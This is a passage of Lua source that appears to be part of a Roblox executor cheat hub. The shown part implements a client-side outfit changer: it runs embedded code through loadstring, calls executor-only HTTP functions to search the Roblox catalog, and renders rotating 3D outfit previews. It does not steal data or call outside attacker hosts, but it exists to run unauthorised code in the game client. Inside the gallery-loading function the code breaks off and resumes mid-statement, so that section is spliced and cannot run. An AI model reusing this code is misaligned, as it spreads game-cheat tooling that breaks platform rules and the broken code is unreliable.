root=clone:FindFirstChild("HumanoidRootPart") or clone:FindFirstChild("LowerTorso") or clone:FindFirstChild("Torso")\nif not root then clone:Destroy(); return nil end\nlocal savedVisuals,savedHidden,savedWearable=state.visuals,state.hidden,state.wearableConn; state.visuals={}; state.hidden={}; state.wearableConn=nil\nlocal ids={}; for _,id in ipairs(option.bodyItems or {}) do table.insert(ids,id) end; for _,id in ipairs(option.items or {}) do table.insert(ids,id) end\nif option.head then table.insert(ids,option.head) end; if option.face and option.faceMode~="decal" then table.insert(ids,option.face) end\nfor _,id in ipairs(ids) do\nlocal objects=loadAssetObjects(id)\nif objects then for _,loadedRoot in ipairs(objects) do\npcall(attachClassicClothingLocal,loadedRoot,clone,id)\nlocal accessories={}; if loadedRoot:IsA("Accessory") then table.insert(accessories,loadedRoot) else for _,object in ipairs(loadedRoot:GetDescendants()) do if object:IsA("Accessory") then table.insert(accessories,object:Clone()) end end end\nfor _,accessory in ipairs(accessories) do pcall(attachAccessoryLocal,accessory,clone,root,id) end\nlocal isBody=table.find(option.bodyItems or {},id)~=nil or id==option.head\nif isBody then pcall(attachBodyPartsLocal,loadedRoot,clone,id,option.headTexture) end\nif loadedRoot.Parent and not table.find(state.visuals,loadedRoot) then pcall(function() loadedRoot:Destroy() end) end\nend end\nend\nstate.visuals,state.hidden,state.wearableConn=savedVisuals,savedHidden,savedWearable\nif option.face and option.faceMode=="decal" then local head=clone:FindFirstChild("Head"); if head then local face=head:FindFirstChild("face") or head:FindFirstChildWhichIsA("Decal"); if not face then face=Instance.new("Decal"); face.Name="face"; face.Face=Enum.NormalId.Front; face.Parent=head end; face.Texture=resolveFaceTexture(option.face); face.Transparency=0 end end\nif option.headless or option.hideOriginalHead then local head=clone:FindFirstChild("Head"); if head then head.Transparency=1; for _,v in ipairs(head:GetDescendants()) do if v:IsA("Decal") or v:IsA("Texture") then v.Transparency=1 end end end end\nif option.hideRightLeg then for _,name in ipairs({"RightUpperLeg","RightLowerLeg","RightFoot","Right Leg"}) do local part=clone:FindFirstChild(name); if part then part.Transparency=1 end end end\nreturn clone\nend,\ncleanup = function()\nstate.enabled = false\nclearVisuals()\nrestoreOriginalDescription()\nend,\n}\n'
local engine, engineTried = nil, false
local function getEngine()
    if engine then return engine end
    if engineTried or not loadstring then return nil end
    engineTried = true
    local ok, fn; do local __m = {pcall(loadstring, OUTFIT_SRC)}; ok = __m[1]; fn = __m[2]; end
    if ok and fn then local ok2, res; do local __m = {pcall(fn)}; ok2 = __m[1]; res = __m[2]; end if ok2 and type(res) == "table" then engine = res end end
    OUTFIT_SRC = nil
    return engine
end
local function thumb(o) if not o.asset then return "" end return "rbxthumb://type=Asset&id=" .. string.format("%.0f", o.asset) .. "&w=420&h=420" end
S.outfitSel = math.clamp(math.floor(tonumber(S.outfitSel) or 1), 1, #OUTFIT_LIST)
S.outfitOn = S.outfitOn == true
local row = Instance.new("Frame", pageSYS); row.Size = UDim2.new(1, 0, 0, 62); row.LayoutOrder = LO(); row.BorderSizePixel = 0; row.BackgroundColor3 = COLORS.row2 or Color3.fromRGB(24,24,28); corner(row, 12); stroke(row, COLORS.stroke, 1, 0.6)
local img = Instance.new("ImageLabel", row); img.Size = UDim2.fromOffset(42, 42); img.Position = UDim2.new(0, 10, 0.5, -21); img.BackgroundColor3 = Color3.fromRGB(14,14,16); img.BorderSizePixel = 0; img.ScaleType = Enum.ScaleType.Crop; corner(img, 10)
local nameL = Instance.new("TextLabel", row); nameL.Size = UDim2.new(1, -176, 0, 21); nameL.Position = UDim2.new(0, 62, 0, 10); nameL.BackgroundTransparency = 1; nameL.Font = Enum.Font.GothamBold; nameL.TextSize = 12; nameL.TextXAlignment = Enum.TextXAlignment.Left
local subL = Instance.new("TextLabel", row); subL.Size = UDim2.new(1, -176, 0, 16); subL.Position = UDim2.new(0, 62, 0, 32); subL.BackgroundTransparency = 1; subL.TextColor3 = Color3.fromRGB(150,150,160); subL.Font = Enum.Font.GothamMedium; subL.TextSize = 9; subL.TextXAlignment = Enum.TextXAlignment.Left
local skinsBtn = Instance.new("TextButton", row); skinsBtn.Size = UDim2.fromOffset(60, 28); skinsBtn.Position = UDim2.new(1, -120, 0.5, -14); skinsBtn.BackgroundColor3 = Color3.fromRGB(40,40,44); skinsBtn.BorderSizePixel = 0; skinsBtn.Text = "OUTFITS"; skinsBtn.TextColor3 = COLORS.white; skinsBtn.Font = Enum.Font.GothamBold; skinsBtn.TextSize = 10; corner(skinsBtn, 8)
local onBtn = Instance.new("TextButton", row); onBtn.Size = UDim2.fromOffset(44, 24); onBtn.Position = UDim2.new(1, -52, 0.5, -12); onBtn.BorderSizePixel = 0; onBtn.Font = Enum.Font.GothamBold; onBtn.TextSize = 10; onBtn.TextColor3 = COLORS.white; corner(onBtn, 12)
local cards = {}
local function refresh()
    local o = OUTFIT_LIST[S.outfitSel]
    nameL.Text = o.name; nameL.TextColor3 = S.outfitOn and COLORS.white or Color3.fromRGB(150,150,160)
    subL.Text = (S.outfitOn and "ACTIVE  |  " or "OFF  |  ") .. o.sub
    img.Image = thumb(o)
    onBtn.Text = S.outfitOn and "ON" or "OFF"
    onBtn.BackgroundColor3 = S.outfitOn and Color3.fromRGB(60,170,90) or Color3.fromRGB(50,50,56)
    for i, c in pairs(cards) do c.stroke.Transparency = (i == S.outfitSel) and 0 or 0.8; c.stroke.Color = (i == S.outfitSel) and Color3.fromRGB(255,255,255) or Color3.fromRGB(90,90,100) end
end
local function applyNow()
    local e = getEngine()
    if not e and not OUTFIT_LIST[S.outfitSel].pack then warn("[Zombie.Vs] Outfit: executor sem loadstring"); return end
    local o = OUTFIT_LIST[S.outfitSel]
    if e then pcall(function() if e.remove then e.remove() end end) end
    if o.pack then
        K7.accessoryPackEnabled = S.outfitOn
        if S.outfitOn then pcall(K7.applyAccessoryPack, o.pack) else pcall(K7.resetAccessoryPack) end
        return
    end
    if K7.accessoryPackEnabled or (K7.accessoryPackName and K7.accessoryPackName ~= "Off") then K7.accessoryPackEnabled = false; pcall(K7.resetAccessoryPack) end
    if S.outfitOn and e and e.apply then pcall(e.apply, S.outfitSel) end
end
UI.applyOutfit = function() refresh(); applyNow() end
onBtn.Activated:Connect(function() S.outfitOn = not S.outfitOn; refresh(); applyNow(); pcall(F.saveConfig) end)
-- Galeria (Skin Collection)
local gui = pageSYS:FindFirstAncestorOfClass("ScreenGui")
local gal = Instance.new("Frame", gui); gal.Name = "Zombie_OutfitGallery"; gal.Size = UDim2.fromOffset(520, 420); gal.AnchorPoint = Vector2.new(0.5, 0.5); gal.Position = UDim2.fromScale(0.5, 0.5); gal.BackgroundColor3 = Color3.fromRGB(14,14,16); gal.BorderSizePixel = 0; gal.Visible = false; gal.ZIndex = 220; gal.Active = true; corner(gal, 16); stroke(gal, COLORS.stroke, 1.3, 0.3)
local gs = Instance.new("UISizeConstraint", gal); gs.MaxSize = Vector2.new(520, 420)
-- Mantem a galeria menor e com margem segura, inclusive no celular.
local galScale = Instance.new("UIScale", gal)
local function updateGalleryScale()
    local cam = workspace.CurrentCamera
    local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
    -- Limita a 82% mesmo em telas grandes e reserva espaco para o botao de ocultar.
    galScale.Scale = math.max(0.42, math.min(0.82, (vp.X - 56) / 520, (vp.Y - 72) / 420))
    gal.Position = UDim2.fromScale(0.5, 0.5)
end
updateGalleryScale()
if workspace.CurrentCamera then workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateGalleryScale) end
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
    updateGalleryScale()
    local cam = workspace.CurrentCamera
    if cam then cam:GetPropertyChangedSignal("ViewportSize"):Connect(updateGalleryScale) end
end)
local top = Instance.new("Frame", gal); top.Size = UDim2.new(1, 0, 0, 60); top.BackgroundTransparency = 1; top.ZIndex = 221
local t1 = Instance.new("TextLabel", top); t1.Size = UDim2.new(1, -60, 0, 24); t1.Position = UDim2.new(0, 16, 0, 8); t1.BackgroundTransparency = 1; t1.Text = "OUTFITS"; t1.TextColor3 = COLORS.white; t1.Font = Enum.Font.GothamBold; t1.TextSize = 13; t1.TextXAlignment = Enum.TextXAlignment.Left; t1.ZIndex = 222
local t2 = Instance.new("TextLabel", top); t2.Size = UDim2.new(1, -60, 0, 16); t2.Position = UDim2.new(0, 16, 0, 32); t2.BackgroundTransparency = 1; t2.Text = "Outfit 1 - Outfit 17"; t2.TextColor3 = Color3.fromRGB(150,150,160); t2.Font = Enum.Font.GothamMedium; t2.TextSize = 9; t2.TextXAlignment = Enum.TextXAlignment.Left; t2.ZIndex = 222
local x = Instance.new("TextButton", top); x.Size = UDim2.fromOffset(32, 32); x.Position = UDim2.new(1, -44, 0, 13); x.BackgroundColor3 = Color3.fromRGB(40,40,44); x.BorderSizePixel = 0; x.Text = "X"; x.TextColor3 = COLORS.white; x.Font = Enum.Font.GothamBold; x.TextSize = 10; x.ZIndex = 223; corner(x, 10)
local sc = Instance.new("ScrollingFrame", gal); sc.Size = UDim2.new(1, -20, 1, -80); sc.Position = UDim2.new(0, 10, 0, 68); sc.BackgroundTransparency = 1; sc.BorderSizePixel = 0; sc.ScrollBarThickness = 2; sc.AutomaticCanvasSize = Enum.AutomaticSize.Y; sc.CanvasSize = UDim2.new(); sc.ZIndex = 221
local grid = Instance.new("UIGridLayout", sc); grid.CellSize = UDim2.fromOffset(116, 150); grid.CellPadding = UDim2.fromOffset(8, 8); grid.SortOrder = Enum.SortOrder.LayoutOrder; grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
local previewGeneration = 0
local OUTFIT_PACK_PREVIEWS = {
    ["Skin 1"] = { accessory = 306969564, offset = Vector3.new(0, 0.3, 0), shirt = "http://www.roblox.com/asset/?id=10632503795", pants = "http://www.roblox.com/asset/?id=123161592384863", korblox = "right" },
    ["Skin 2"] = { accessory = 1744060292, offset = Vector3.new(0, 1.4, -0.2), shirt = "http://www.roblox.com/asset/?id=11526718530", pants = "http://www.roblox.com/asset/?id=93710523210027", korblox = "right" },
    ["Skin 3"] = { accessory = 112564966849233, offset = Vector3.new(0, 0.6, 0), shirt = "http://www.roblox.com/asset/?id=11849088376", pants = "http://www.roblox.com/asset/?id=16534673928", korblox = "right" },
    ["Skin 4"] = { accessory = 10159600649, offset = Vector3.new(0, 1, -0.2), shirt = "http://www.roblox.com/asset/?id=9683332638", pants = "http://www.roblox.com/asset/?id=93182020184041" },
    ["Skin 5"] = { accessory = 8349240186, offset = Vector3.new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=11926549070", pants = "http://www.roblox.com/asset/?id=13189494471" },
    ["Skin 6"] = { accessory = 121097973925756, offset = Vector3.new(0, 0.9, 0), shirt = "http://www.roblox.com/asset/?id=123181702116947", pants = "http://www.roblox.com/asset/?id=93330291631062" },
    ["Skin 7"] = { pants = "rbxassetid://78591690208112", skinColor = Color3.fromRGB(234,184,146), headColor = Color3.fromRGB(0,0,0), items = {103227869700418,84952305140948,122465238537030} },
}
-- ========================================================
-- 3D SKINS PREVIEW ENGINE (Baseado no sistema do Vx7)
-- ========================================================
local _VX7SkinPreviewCache = rawget(_G, "__VX7SkinPreviewCacheV2")
if type(_VX7SkinPreviewCache) ~= "table" then
    _VX7SkinPreviewCache = {}
    rawset(_G, "__VX7SkinPreviewCacheV2", _VX7SkinPreviewCache)
end

local VX7_SKIN_ITEMS = {
    [1]  = { ids = { 10997283529, 125085889448130 } }, -- OUTFIT 1
    [2]  = { ids = { 125157548394108, 123231522991173, 74827642361405 } }, -- OUTFIT 2
    [3]  = { ids = { 136644276218918, 132022106987543, 131740907052260 } }, -- OUTFIT 3
    [4]  = { ids = { 119331031817124, 84952305140948 }, headless = true }, -- OUTFIT 4
    [5]  = { ids = { 18902416696, 17739456422, 116750288839357, 12842417046, 122223069519702 }, headless = true }, -- OUTFIT 5
    [6]  = { ids = { 13935333090, 16110951997, 10632503818 } }, -- OUTFIT 6
    [7]  = { ids = { 74891470, 4390891467, 91274263831244, 128424248603010, 91151766440767, 17044638424 }, headless = true }, -- OUTFIT 7
    [8]  = { ids = { 76479271580913, 1402432199, 140627490971265, 128912609563885, 17449551560, 5796531729, 139607718 }, headless = true, hideR = true }, -- OUTFIT 8
    [9]  = { ids = { 70414871864071, 14863917259, 133498027006138, 82277826177074 }, hideL = true, hideR = true }, -- OUTFIT 9
    [10] = { ids = { 10928435480, 6913613757, 9683332649 } }, -- OUTFIT 10
}

local function fn89_getClone()
    local char = LP.Character
    if not char then return nil end
    local arch = char.Archivable
    char.Archivable = true
    local ok, clone; do local __m = {pcall(function() return char:Clone() end)}; ok = __m[1]; clone = __m[2]; end
    char.Archivable = arch
    if not ok or not clone then return nil end

    for _, d in ipairs(clone:GetDescendants()) do
        if d:IsA("LuaSourceContainer") or d:IsA("Script") or d:IsA("LocalScript") or d.Name == "Animate"
           or d:IsA("Tool") or d:IsA("ForceField") or d:IsA("LinearVelocity") or d:IsA("AlignPosition")
           or d:IsA("AngularVelocity") or d:IsA("BillboardGui") or d:IsA("SurfaceGui")
           or d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Highlight") then
            pcall(function() d:Destroy() end)
        elseif d:IsA("BasePart") then
            d.Anchored = true
            d.CanCollide = false
            d.CanQuery = false
            d.CanTouch = false
            d.LocalTransparencyModifier = 0
            if d.Name == "HumanoidRootPart" then d.Transparency = 1 end
        end
    end
    local hum = clone:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        for _, t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop() end) end
        local anim = hum:FindFirstChildOfClass("Animator")
        if anim then pcall(function() anim:Destroy() end) end
    end
    return clone
end

local function fn91_stripWearables(rig)
    for _, child in ipairs(rig:GetChildren()) do
        if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt")
           or child:IsA("Pants") or child:IsA("ShirtGraphic") or child:IsA("CharacterMesh") then
            pcall(function() child:Destroy() end)
        end
    end
end

local function fn92_applyIds(parent, ids)
    for _, id in ipairs(ids or {}) do
        local ok, objs; do local __m = {pcall(function() return game:GetObjects("rbxassetid://" .. tostring(id)) end)}; ok = __m[1]; objs = __m[2]; end
        if not (ok and objs and #objs > 0) then
            do local __m = {pcall(function() return { game:GetService("InsertService"):LoadAsset(id) } end)}; ok = __m[1]; objs = __m[2]; end
        end
        if ok and objs and #objs > 0 then
            for _, item in ipairs(objs) do
                if item:IsA("Accessory") or item:IsA("Accoutrement") then
                    local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart", true)
                    if handle then
                        local att = handle:FindFirstChildOfClass("Attachment")
                        local targetPart, targetAtt
                        if att then
                            for _, child in ipairs(parent:GetChildren()) do
                                if child:IsA("BasePart") then
                                    local foundAtt = child:FindFirstChild(att.Name)
                                    if foundAtt then
                                        targetPart, targetAtt = child, foundAtt
                                        break
                                    end
                                end
                            end
                        end
                        targetPart = targetPart or parent:FindFirstChild("Head") or parent:FindFirstChild("HumanoidRootPart")
                        if targetPart then
                            if targetAtt and att then
                                handle.CFrame = targetAtt.WorldCFrame * att.CFrame:Inverse()
                            else
                                handle.CFrame = targetPart.CFrame
                            end
                            local wc = Instance.new("WeldConstraint")
                            wc.Part0 = handle
                            wc.Part1 = targetPart
                            wc.Parent = handle
                            handle.Anchored = false
                            handle.CanCollide = false
                            item.Parent = parent
                        end
                    end
                elseif item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
                    local existing = parent:FindFirstChildOfClass(item.ClassName)
                    if existing then pcall(function() existing:Destroy() end) end
                    item.Parent = parent
                end
            end
        end
    end
end

local function fn90_mount(viewport, model)
    if not viewport or not viewport.Parent or not model then
        if model then model:Destroy() end
        return
    end
    for _, c in ipairs(viewport:GetChildren()) do c:Destroy() end
    local worldModel = Instance.new("WorldModel")
    worldModel.Name = "PreviewWorld"
    worldModel.Parent = viewport
    model.Name = "OutfitPreview"
    model.Parent = worldModel
    model:PivotTo(CFrame.new())

    -- Camera setup com FOV 28 e enquadramento ideal proporcional (sem ficar minúsculo ou fora de foco)
    local camera = Instance.new("Camera")
    camera.FieldOfView = 28
    camera.Parent = viewport
    viewport.CurrentCamera = camera

    local hrp = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("UpperTorso") or model:FindFirstChild("Torso")
    local bodyPos = hrp and hrp.Position or Vector3.new(0, 2.8, 0)
    local cf, size; do local __m = {model:GetBoundingBox()}; cf = __m[1]; size = __m[2]; end
    local focus = Vector3.new(bodyPos.X, bodyPos.Y + 0.15, bodyPos.Z)

    -- Distância calculada e limitada (clamped entre 7.5 e 9.8 para manter tamanho 3D nítido e visível)
    local dist = math.clamp(math.max(size.Y * 1.5, size.X * 1.7), 7.2, 9.8)
    camera.CFrame = CFrame.lookAt(focus + Vector3.new(0, 0, -dist), focus)
end

local function makeVx7PackPreview(packName)
    local clone = fn89_getClone()
    if not clone then return nil end
    fn91_stripWearables(clone)
    local cfg = OUTFIT_PACK_PREVIEWS[packName]
    if cfg then
        if cfg.shirt then
            local shirt = Instance.new("Shirt", clone)
            shirt.ShirtTemplate = cfg.shirt
        end
        if cfg.pants then
            local pants = Instance.new("Pants", clone)
            pants.PantsTemplate = cfg.pants
        end
        if cfg.korblox and cfg.korblox ~= "none" then
            local names = cfg.korblox == "left" and {"LeftUpperLeg","LeftLowerLeg","LeftFoot","Left Leg"} or {"RightUpperLeg","RightLowerLeg","RightFoot","Right Leg"}
            for _, name in ipairs(names) do
                local part = clone:FindFirstChild(name)
                if part and part:IsA("BasePart") then part.Transparency = 1 end
            end
        end
        if cfg.accessory then
            fn92_applyIds(clone, {cfg.accessory})
        end
        if cfg.items then
            fn92_applyIds(clone, cfg.items)
        end
        if cfg.skinColor then
            local colors = clone:FindFirstChildWhichIsA("BodyColors") or Instance.new("BodyColors", clone)
            colors.HeadColor3 = cfg.headColor or cfg.skinColor
            colors.TorsoColor3 = cfg.skinColor
            colors.LeftArmColor3 = cfg.skinColor
            colors.RightArmColor3 = cfg.skinColor
            colors.LeftLegColor3 = cfg.skinColor
            colors.RightLegColor3 = cfg.skinColor
        end
    end
    return clone
end

local function loadGalleryPreviews()
    previewGeneration = previewGeneration + 1
    local generation = previewGeneration

    }; ok = __m[1]; copy = __m[2]; end
                    if ok and copy then
                        fn90_mount(card.viewport, copy)
                        card.preview.Visible = false
                    end
                else
                    local model = nil
                    if o.pack then
                        model = makeVx7PackPreview(o.pack)
                    else
                        local data = VX7_SKIN_ITEMS[i]
                        local ids = (data and data.ids) or o.previewItems or (o.asset and {o.asset})
                        local clone = fn89_getClone()
                        if clone then
                            fn91_stripWearables(clone)
                            if ids then fn92_applyIds(clone, ids) end
                            if data and data.headless then
                                local head = clone:FindFirstChild("Head")
                                if head then
                                    head.Transparency = 1
                                    for _, desc in ipairs(head:GetDescendants()) do
                                        if desc:IsA("Decal") or desc:IsA("Texture") then desc.Transparency = 1 end
                                    end
                                end
                            end
                            if data and data.hideR then
                                for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}) do
                                    local p = clone:FindFirstChild(partName)
                                    if p then p.Transparency = 1 end
                                end
                            end
                            if data and data.hideL then
                                for _, partName in ipairs({"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "Left Leg"}) do
                                    local p = clone:FindFirstChild(partName)
                                    if p then p.Transparency = 1 end
                                end
                            end
                            model = clone
                        end
                    end

                    if model then
                        -- Salva cópia limpa no cache
                        local ok, cacheCopy; do local __m = {pcall(function() return model:Clone() end)}; ok = __m[1]; cacheCopy = __m[2]; end
                        if ok and cacheCopy then
                            cacheCopy.Parent = nil
                            _VX7SkinPreviewCache[i] = cacheCopy
                        end
                        fn90_mount(card.viewport, model)
                        card.preview.Visible = false
                    end
                end
            end
            task.wait(0.04)
        end
    end)
end

-- Rotação suave em 3D dos modelos no seletor (igual ao Vx7)
local _skinRotConn = nil
local _skinRotAccum = 0
local function initSkinRotation()
    if _skinRotConn then return end
    _skinRotConn = RunService.Heartbeat:Connect(function(dt)
        if not gal or not gal.Visible then return end
        _skinRotAccum = _skinRotAccum + math.clamp(dt or 0.016, 0, 0.1)
        if _skinRotAccum < 0.033 then return end
        local rotAngle = math.rad(22 * _skinRotAccum)
        _skinRotAccum = 0
        for _, card in ipairs(cards) do
            if card and card.viewport and card.viewport.Parent then
                local wm = card.viewport:FindFirstChildOfClass("WorldModel")
                local m = wm and wm:FindFirstChildWhichIsA("Model", true)
                if m then pcall(function() m:PivotTo(m:GetPivot() * CFrame.Angles(0, rotAngle, 0)) end) end
            end
        end
    end)
end
task.defer(initSkinRotation)
for i, o in ipairs(OUTFIT_LIST) do
    local c = Instance.new("TextButton", sc); c.LayoutOrder = i; c.Text = ""; c.AutoButtonColor = true; c.BackgroundColor3 = Color3.fromRGB(24,24,28); c.BorderSizePixel = 0; c.ZIndex = 222; corner(c, 12)
    local st = Instance.new("UIStroke", c); st.Thickness = 1.4; st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local pv = Instance.new("ImageLabel", c); pv.Size = UDim2.new(1, -12, 0, 100); pv.Position = UDim2.new(0, 6, 0, 6); pv.BackgroundColor3 = Color3.fromRGB(14,14,16); pv.BorderSizePixel = 0; pv.ScaleType = Enum.ScaleType.Fit; pv.Image = thumb(o); pv.ZIndex = 223; corner(pv, 9) if not o.asset then local ph = Instance.new("TextLabel", pv); ph.Size = UDim2.fromScale(1, 1); ph.BackgroundTransparency = 1; ph.Text = o.name; ph.TextColor3 = COLORS.white; ph.Font = Enum.Font.GothamBlack; ph.TextSize = 14; ph.ZIndex = 224 end
    local viewport = Instance.new("ViewportFrame", c); viewport.Name = "OutfitViewport"; viewport.Size = pv.Size; viewport.Position = pv.Position; viewport.BackgroundTransparency = 1; viewport.BorderSizePixel = 0; viewport.ZIndex = 225
    local n = Instance.new("TextLabel", c); n.Size = UDim2.new(1, -8, 0, 18); n.Position = UDim2.new(0, 4, 0, 110); n.BackgroundTransparency = 1; n.Text = o.name; n.TextColor3 = COLORS.white; n.Font = Enum.Font.GothamBold; n.TextSize = 11; n.ZIndex = 223
    local sb = Instance.new("TextLabel", c); sb.Size = UDim2.new(1, -8, 0, 14); sb.Position = UDim2.new(0, 4, 0, 128); sb.BackgroundTransparency = 1; sb.Text = o.sub; sb.TextColor3 = Color3.fromRGB(150,150,160); sb.Font = Enum.Font.GothamMedium; sb.TextSize = 8; sb.TextTruncate = Enum.TextTruncate.AtEnd; sb.ZIndex = 223
    cards[i] = { stroke = st, preview = pv, viewport = viewport }
    c.Activated:Connect(function()
        S.outfitSel = i; S.outfitOn = true; refresh(); applyNow(); pcall(F.saveConfig)
        -- Fecha somente o seletor e mantem a aba atual do hub.
        previewGeneration = previewGeneration + 1
        if gal and gal.Parent then gal.Visible = false end
    end)
end
x.Activated:Connect(function() previewGeneration = previewGeneration + 1; gal.Visible = false end)
skinsBtn.Activated:Connect(function()
    gal.Visible = not gal.Visible
    updateGalleryScale()
    if gal.Visible then loadGalleryPreviews() else previewGeneration = previewGeneration + 1 end
end)
refresh()
UI.applyOutfit = function() refresh(); applyNow() end
if S.outfitOn then task.delay(1.5, function() if S.outfitOn then refresh(); pcall(applyNow) end end) end
LP.CharacterAdded:Connect(function() task.delay(1.2, function() if S.outfitOn then applyNow() end end) end)
end
-- CUSTOM avatar fica abaixo das skins prontas e abre/oculta pela seta
section(pageSYS, "CUSTOM Avatar")
do
local expanded=false;local headerH=34;local rowH=36;local gap=4;local bodyH=(#AVATAR_CATEGORIES*rowH)+((#AVATAR_CATEGORIES-1)*gap)+8
local wrap=Instance.new("Frame",pageSYS);wrap.Size=UDim2.new(1,0,0,headerH);wrap.BackgroundTransparency=1;wrap.ClipsDescendants=true;wrap.LayoutOrder=LO()
local header=Instance.new("Frame",wrap);header.Size=UDim2.new(1,0,0,headerH);header.BackgroundColor3=COLORS.row;header.BackgroundTransparency=0.18;header.BorderSizePixel=0;corner(header,9);stroke(header,COLORS.strokeSoft,1,0.5)
local arrow=Instance.new("TextLabel",header);arrow.Size=UDim2.new(0,24,1,0);arrow.Position=UDim2.new(0,8,0,0);arrow.BackgroundTransparency=1;arrow.Text="▶";arrow.TextColor3=COLORS.accentStrong;arrow.Font=Enum.Font.GothamBold;arrow.TextSize=12
local title=Instance.new("TextLabel",header);title.Size=UDim2.new(1,-44,1,0);title.Position=UDim2.new(0,32,0,0);title.BackgroundTransparency=1;title.Text="CUSTOM Avatar";title.TextColor3=COLORS.white;title.Font=Enum.Font.GothamBold;title.TextSize=12;title.TextXAlignment=Enum.TextXAlignment.Left
local body=Instance.new("Frame",wrap);body.Position=UDim2.new(0,0,0,headerH+4);body.Size=UDim2.new(1,0,0,bodyH);body.BackgroundTransparency=1;body.Visible=false
local layout=Instance.new("UIListLayout",body);layout.Padding=UDim.new(0,gap);layout.SortOrder=Enum.SortOrder.LayoutOrder
local CATALOG_HTTP_TYPES = {Hat="Hat",HairAccessory="HairAccessory",FaceAccessory="FaceAccessory",NeckAccessory="NeckAccessory",ShoulderAccessory="ShoulderAccessory",FrontAccessory="FrontAccessory",BackAccessory="BackAccessory",WaistAccessory="WaistAccessory",Shirt="Shirt",Pants="Pants",TShirt="TShirt",JacketAccessory="JacketAccessory",SweaterAccessory="SweaterAccessory",ShortsAccessory="ShortsAccessory"}
local function httpGetJson(url)
    local body=nil
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        local ok, res; do local __m = {pcall(function() return req({Url=url,Method="GET",Headers={["Content-Type"]="application/json"}}) end)}; ok = __m[1]; res = __m[2]; end
        if ok and res and (res.Body or res.body) then body=res.Body or res.body end
    end
    if not body then
        local ok2, res2; do local __m = {pcall(function() return game:HttpGet(url) end)}; ok2 = __m[1]; res2 = __m[2]; end
        if ok2 then body=res2 end
    end
    if not body then return nil end
    local ok3, data; do local __m = {pcall(function() return HS:JSONDecode(body) end)}; ok3 = __m[1]; data = __m[2]; end
    if ok3 then return data end
    return nil
end
local function webSearchCatalog(category,query)
    local typeName = nil
    for _,at in ipairs(category.assetTypes) do
        local n = tostring(at):gsub("^Enum%.AvatarAssetType%.","")
        typeName = CATALOG_HTTP_TYPES[n] or typeName
    end
    if not typeName then return nil end
    local url = "https://catalog.roblox.com/v1/search/items/details?Category=11&Limit=30&AssetTypeName="..typeName
    if query and query ~= "" then
        url = url .. "&Keyword=" .. (HS:UrlEncode(query))
    end
    local data = httpGetJson(url)
    if not data or type(data.data) ~= "table" then return nil end
    local out = {}
    for _,entry in ipairs(data.data) do
        if entry.id then out[#out+1] = {Id=entry.id,Name=entry.name or "Item"} end
    end
    return out
end
local function closePicker() local old=gui:FindFirstChild("ZombieVSCustomAvatarCatalog") if old then old:Destroy() end end
local function openCatalog(category)
closePicker()
local modal=Instance.new("Frame",gui);modal.Name="ZombieVSCustomAvatarCatalog";modal.Size=UDim2.new(1,0,1,0);modal.BackgroundColor3=Color3.fromRGB(0,0,0);modal.BackgroundTransparency=0.32;modal.ZIndex=50
local panel=Instance.new("Frame",modal);panel.AnchorPoint=Vector2.new(0.5,0.5);panel.Position=UDim2.new(0.5,0,0.5,0);panel.Size=UDim2.new(0,360,0,470);panel.BackgroundColor3=COLORS.bg;panel.BorderSizePixel=0;panel.ZIndex=51;corner(panel,14);stroke(panel,COLORS.stroke,1,0.25)
local caption=Instance.new("TextLabel",panel);caption.Position=UDim2.new(0,14,0,8);caption.Size=UDim2.new(1,-58,0,32);caption.BackgroundTransparency=1;caption.Text=category.name.." Catalog";caption.TextColor3=COLORS.white;caption.Font=Enum.Font.GothamBlack;caption.TextSize=14;caption.TextXAlignment=Enum.TextXAlignment.Left;caption.ZIndex=52
local x=Instance.new("TextButton",panel);x.Position=UDim2.new(1,-42,0,8);x.Size=UDim2.new(0,32,0,32);x.BackgroundColor3=COLORS.row2;x.BorderSizePixel=0;x.Text="×";x.TextColor3=COLORS.white;x.Font=Enum.Font.GothamBlack;x.TextSize=18;x.ZIndex=53;corner(x,8);x.Activated:Connect(closePicker)
local search=Instance.new("TextBox",panel);search.Position=UDim2.new(0,12,0,48);search.Size=UDim2.new(1,-24,0,32);search.BackgroundColor3=COLORS.row;search.BorderSizePixel=0;search.PlaceholderText="Search catalog...";search.Text="";search.TextColor3=COLORS.white;search.PlaceholderColor3=COLORS.textDim;search.Font=Enum.Font.GothamBold;search.TextSize=11;search.ClearTextOnFocus=false;search.ZIndex=52;corner(search,8)
local status=Instance.new("TextLabel",panel);status.Position=UDim2.new(0,12,0,84);status.Size=UDim2.new(1,-24,0,20);status.BackgroundTransparency=1;status.Text="Loading...";status.TextColor3=COLORS.textDim;status.Font=Enum.Font.GothamBold;status.TextSize=10;status.ZIndex=52
local scroll=Instance.new("ScrollingFrame",panel);scroll.Position=UDim2.new(0,8,0,106);scroll.Size=UDim2.new(1,-16,1,-114);scroll.BackgroundTransparency=1;scroll.BorderSizePixel=0;scroll.ScrollBarThickness=3;scroll.ScrollBarImageColor3=COLORS.accent;scroll.AutomaticCanvasSize=Enum.AutomaticSize.Y;scroll.CanvasSize=UDim2.new();scroll.ZIndex=52
local grid=Instance.new("UIGridLayout",scroll);grid.CellSize=UDim2.new(0,104,0,112);grid.CellPadding=UDim2.new(0,7,0,7);grid.HorizontalAlignment=Enum.HorizontalAlignment.Center;grid.SortOrder=Enum.SortOrder.LayoutOrder
local pages=nil;local loading=false;local token=0
local function card(item)
local b=Instance.new("TextButton",scroll);b.Name="Avatar_"..tostring(item.Id);b.BackgroundColor3=COLORS.row;b.BorderSizePixel=0;b.Text="";b.ZIndex=53;corner(b,8);stroke(b,COLORS.strokeSoft,1,0.55)
